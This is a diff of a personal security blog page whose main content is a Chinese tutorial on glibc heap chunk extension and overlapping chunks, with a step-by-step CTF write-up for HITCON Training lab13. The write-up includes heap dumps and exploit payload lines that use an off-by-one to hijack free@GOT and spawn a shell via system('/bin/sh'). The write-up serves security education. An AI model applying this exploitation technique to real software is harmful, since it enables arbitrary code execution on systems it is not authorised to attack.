@@ -5,8 +5,8 @@
   <meta name="Volantis" content="6.0.0-alpha.1">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="index,follow">
-  <link rel="canonical" href="http://example.com/"/>
+  
+  <link rel="canonical" href="http://example.com/2020/10/27/pwn_overlap/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -34,16 +34,24 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>x1ngg3's blog</title>
-  <meta name="keywords" content="">
-  <meta desc name="description" content="x1ngg3's blog - John Doe - x1ngg3's blog">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="x1ngg3&#39;s blog">
-<meta property="og:url" content="http://example.com/index.html">
+  <title>water one water - x1ngg3's blog</title>
+  <meta name="keywords" content="pwn,heap,chunk_extend,overlap,null">
+  <meta desc name="description" content="Chunk_extend &amp; Overlap - John Doe - x1ngg3's blog">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="water one water">
+<meta property="og:url" content="http://example.com/2020/10/27/pwn_overlap/index.html">
 <meta property="og:site_name" content="x1ngg3&#39;s blog">
+<meta property="og:description" content="Chunk_extend &amp; Overlap">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2020-10-27T00:00:00.000Z">
+<meta property="article:modified_time" content="2024-02-27T13:11:48.641Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="chunk_extend">
+<meta property="article:tag" content="overlap">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2100,7 +2108,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2165,7 +2173,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin begin-->
     
     <!-- Custom Files bodyBegin end-->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2432,263 +2440,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div id="l_body">
       <div id="l_cover">
   
-    
-      <div class="cover-wrapper  dock" id='full'>
-        
-  <div class='cover-bg lazyload placeholder' data-bg="https://gcore.jsdelivr.net/gh/MHG-LAB/cron@gh-pages/bing/bing.jpg"></div>
-
-<div class='cover-body'>
-  <div class='top'>
-    
-    
-      <p class="title">X1ngg3</p>
-    
-    
-  </div>
-  <div class='bottom'>
-    <div class='menu navigation'>
-      <div class='list-h'>
-        
-          
-            <a href="/v4/getting-started/"
-              
-              
-              active-action="action-v4getting-started">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f5c3.svg'><p>文档</p>
-            </a>
-          
-            <a href="/faqs/"
-              
-              
-              active-action="action-faqs">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f516.svg'><p>帮助</p>
-            </a>
-          
-            <a href="/examples/"
-              
-              
-              active-action="action-examples">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f396.svg'><p>示例</p>
-            </a>
-          
-            <a href="/contributors/"
-              
-              
-              active-action="action-contributors">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f389.svg'><p>社区</p>
-            </a>
-          
-            <a href="/archives/"
-              
-              
-              active-action="action-archives">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f4f0.svg'><p>博客</p>
-            </a>
-          
-            <a target="_blank" rel="noopener" href="https://github.com/volantis-x/hexo-theme-volantis/"
-              
-              
-              active-action="action-https:githubcomvolantis-xhexo-theme-volantis">
-              <img src='https://unpkg.com/volantis-static@0.0.1660614606622/media/twemoji/assets/svg/1f9ec.svg'><p>源码</p>
-            </a>
-          
-        
-      </div>
-    </div>
-  </div>
-</div>
-
-        <div id="scroll-down"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
-      </div>
-    
-  
 </div>
 
       <div id="safearea">
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-  
-  <section class="post-list">
-    
-      
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/02/atest/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2022/07/02/atest/"  itemprop="url">
-        test--
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>测试博客是否还活着</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2022-07-02T00:00:00+08:00">2022-07-02</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/test/">test</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/test/" itemprop="url"><span itemprop="name">test</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2022/07/02/atest/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/01/pwn_fastbin-attack/">
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="x1ngg3's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="http://schema.org/Post">
-    <meta itemprop="name" content="x1ngg3's blog">
-    <meta itemprop="description" content="">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/11/01/pwn_fastbin-attack/"  itemprop="url">
-        Fastbin Attack related
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      <p>我提莫的心态崩了啊 ಥ_ಥ</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-11-01T00:00:00+08:00">2020-11-01</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2020/11/01/pwn_fastbin-attack/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
   <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/27/pwn_overlap/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="x1ngg3's blog">
@@ -2698,504 +2456,339 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2020/10/27/pwn_overlap/"  itemprop="url">
+    
+    
+      <h1 class="title" itemprop="name headline">
         water one water
-      </a>
-    </h2>
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
   
-  <div class='md article-desc' itemprop="articleBody">
+  
+  
+  <div class='new-meta-item category'>
+    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
+    <a class="category-link" href="/categories/PWN/">PWN</a>
     
-      <p>Chunk_extend &amp; Overlap</p>
+      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+        <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
+      </span>
     
   </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2020-10-27T08:00:00+08:00">2020-10-27</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/PWN/">PWN</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-              <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
-            </span>
+
+
+
           
         
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2020-10-27T08:00:00+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Oct 27, 2020</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
       </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <p>Chunk_extend &amp; Overlap</p>
+<span id="more"></span>
+
+<h3 id="Intorduction"><a href="#Intorduction" class="headerlink" title="Intorduction"></a>Intorduction</h3><p><code>chunk extend</code> 是堆漏洞的一种常见利用手法，通过 extend 可以实现 <code>chunk overlapping</code> 的效果。这种利用方法需要以下的时机和条件：</p>
+<ul>
+<li>程序中存在基于堆的漏洞</li>
+<li>漏洞可以控制 <code>chunk header</code>中的数据 (比如说 <code>off-by-one</code> )</li>
+</ul>
+<h3 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h3><p>在 ptmalloc 中，获取下一 chunk 块地址的操作如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* Ptr to next physical malloc_chunk. */</span><br><span class="line">#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></pre></td></tr></table></figure>
+
+<p>即使用当前块指针加上当前块大小。</p>
+<p>在 ptmalloc 中，获取前一个 chunk 信息的操作如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="line">#define prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><span class="line"></span><br><span class="line">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="line">#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></pre></td></tr></table></figure>
+
+<p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。</p>
+<p>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define inuse(p)</span><br><span class="line">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure>
+
+<p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。</p>
+<p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。<strong>简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的</strong>。</p>
+<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>简单来说，该利用的效果是<strong>通过更改第一个块的大小来控制第二个块的内容</strong>。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(0x10);//分配第一个0x10的chunk</span><br><span class="line">    malloc(0x10);//分配第二个0x10的chunk</span><br><span class="line"></span><br><span class="line">    *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域</span><br><span class="line"></span><br><span class="line">    free(ptr);</span><br><span class="line">    ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当两个 malloc 语句执行之后，堆的内存分布如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk</span><br></pre></td></tr></table></figure>
+
+<p>之后，我们把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为 0x40。在题目中这一步可以由堆溢出得到。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== 篡改大小</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1 </span><br></pre></td></tr></table></figure>
+
+<p>执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Fastbins[idx=0, size=0x10] 0x00</span><br><span class="line">Fastbins[idx=1, size=0x20] 0x00</span><br><span class="line">Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) </span><br><span class="line">Fastbins[idx=3, size=0x40] 0x00</span><br><span class="line">Fastbins[idx=4, size=0x50] 0x00</span><br><span class="line">Fastbins[idx=5, size=0x60] 0x00</span><br><span class="line">Fastbins[idx=6, size=0x70] 0x00</span><br></pre></td></tr></table></figure>
+
+<p>之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">call   0x400450 &lt;malloc@plt&gt;</span><br><span class="line">mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line"></span><br><span class="line">rax = 0x602010</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h3><p>先查看保护和运行一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------</span><br><span class="line">          Heap Creator          </span><br><span class="line">--------------------------------</span><br><span class="line"> 1. Create a Heap               </span><br><span class="line"> 2. Edit a Heap                 </span><br><span class="line"> 3. Show a Heap                 </span><br><span class="line"> 4. Delete a Heap               </span><br><span class="line"> 5. Exit                        </span><br><span class="line">--------------------------------</span><br></pre></td></tr></table></figure>
+
+<h4 id="create"><a href="#create" class="headerlink" title="create"></a>create</h4><p>对于创建的操作，会首先在bss上保存 heap_struct 的地址，然后对于 heap_struct，在其data上会保存用户创建的堆的大小和地址。</p>
+<p><img src="https://i.loli.net/2020/12/05/3N1ITEhSsealfyQ.jpg" class="lazyload" data-srcset="https://i.loli.net/2020/12/05/3N1ITEhSsealfyQ.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="heap_list"></p>
+<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p>向创建的堆的 data 段写入 <code>content_size + 1</code> 个字节，是的没错，这里存在 <code>0ff-by-one</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read_input(*((_QWORD *)heaparray[v1] + <span class="number">1</span>), *(_QWORD *)heaparray[v1] + <span class="number">1LL</span>);<span class="comment">// 向第i个创建堆的数据区写入content_size + 1的大小数据</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="show-delete"><a href="#show-delete" class="headerlink" title="show &amp; delete"></a>show &amp; delete</h4><p>常规，不谈</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>核心思想：</p>
+<p><strong>create 两个 heap，edit 第一个 heap，使其覆盖下一个 heap_struct 的 size，delete 第二个 heap，然后再次 create 并在写content 时覆盖此新创建的 heap_struct 中的 heap_ptr，然后 edit 此新创建的 heap，此时已经是任意写了，到这里，游戏结束</strong>。</p>
+<p>接下来是具体步骤：</p>
+<h5 id="step-1"><a href="#step-1" class="headerlink" title="step_1"></a>step_1</h5><p>先创建两个大小heap，第一个 heap 大小为 0x18 是为了能用到下一个 heap 的pre_size 区域从而在 off-by-one 的时候覆盖掉 size。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(0x18, &quot;a&quot;)       #heap_0,创建heap大小为0x18，content内容为 &quot;a&quot;</span><br><span class="line">create(0x10, &quot;b&quot;)       #heap_1</span><br></pre></td></tr></table></figure>
+
+<p>此时堆上情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x603000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603010:	0x0000000000000018	0x0000000000603030</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603030:	0x0000000000000a61	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603050:	0x0000000000000010	0x0000000000603070</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603070:	0x0000000000000a62	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>
+
+<h5 id="step-2"><a href="#step-2" class="headerlink" title="step_2"></a>step_2</h5><p>编辑 heap_0 的content，利用 off-by-one 覆盖掉 heap1_struct 的 size</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(0, &quot;/bin/sh\x00&quot; + &quot;a&quot; * 0x10 + &quot;\x41&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>此时堆上情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x603000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603010:	0x0000000000000018	0x0000000000603030</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603030:	0x0068732f6e69622f	0x6161616161616161</span><br><span class="line">0x603040:	0x6161616161616161	0x0000000000000041   #这里本来为0x21,已被覆盖为0x41</span><br><span class="line">0x603050:	0x0000000000000010	0x0000000000603070</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603070:	0x0000000000000a62	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>
+
+<p>再来查看堆：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr                prev                size                 status              fd                bk                </span><br><span class="line">0x603000            0x0                 0x20                 Used                None              None</span><br><span class="line">0x603020            0x0                 0x20                 Used                None              None</span><br><span class="line">0x603040            0x6161616161616161  0x40                 Used                None              None</span><br></pre></td></tr></table></figure>
+
+<h5 id="step-3"><a href="#step-3" class="headerlink" title="step_3"></a>step_3</h5><p>delete 掉 heap_1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(1)</span><br></pre></td></tr></table></figure>
+
+<p>此时堆上情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x603000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603010:	0x0000000000000018	0x0000000000603030</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603030:	0x0068732f6e69622f	0x6161616161616161</span><br><span class="line">0x603040:	0x6161616161616161	0x0000000000000041</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000603070</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>
+
+<p>查看堆：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr                prev                size                 status              fd                bk                </span><br><span class="line">0x603000            0x0                 0x20                 Used                None              None</span><br><span class="line">0x603020            0x0                 0x20                 Used                None              None</span><br><span class="line">0x603040            0x6161616161616161  0x40                 Freed                0x0              None</span><br></pre></td></tr></table></figure>
+
+<h5 id="step-4"><a href="#step-4" class="headerlink" title="step_4"></a>step_4</h5><p>create 一个新 heap，注意控制大小以完成 overlap。</p>
+<p>当heap 创建后输入了content 大小但还未输入内容时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x603000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603010:	0x0000000000000018	0x0000000000603030</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603030:	0x0068732f6e69622f	0x6161616161616161</span><br><span class="line">0x603040:	0x6161616161616161	0x0000000000000041   #这里开始是 heap_2</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000603070</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000021   #这里开始是 heap_2_struct</span><br><span class="line">0x603070:	0x0000000000000030	0x0000000000603050 	 #这里是 heap_2 结束，可以看到产生Overlap了，注意这里是指向了0x603050</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr                prev                size                 status              fd                bk                </span><br><span class="line">0x603000            0x0                 0x20                 Used                None              None</span><br><span class="line">0x603020            0x0                 0x20                 Used                None              None</span><br><span class="line">0x603040            0x6161616161616161  0x40                 Used                None              None</span><br></pre></td></tr></table></figure>
+
+<p>此时输入 content 的内容，也就是我们精心构造的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p64(0) * 4 + p64(0x30) + p64(free_got)</span><br></pre></td></tr></table></figure>
+
+<p>此时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x603000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603010:	0x0000000000000018	0x0000000000603030</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603030:	0x0068732f6e69622f	0x6161616161616161</span><br><span class="line">0x603040:	0x6161616161616161	0x0000000000000041</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000030	0x0000000000602018  #这里和上面对比，指针已经被改了</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000020f81</span><br></pre></td></tr></table></figure>
+
+<h5 id="step-5"><a href="#step-5" class="headerlink" title="step_5"></a>step_5</h5><p>接下来只要 edit 堆 heap_2 就可以实现任意写了，这里是选择把 free 改为 system，再加上我们已经提前再 heap_0 的 data 上写了 “&#x2F;bin&#x2F;sh”，那 free(heap_0)就变成了 system(“&#x2F;bin&#x2F;sh”)，芜湖，起飞。</p>
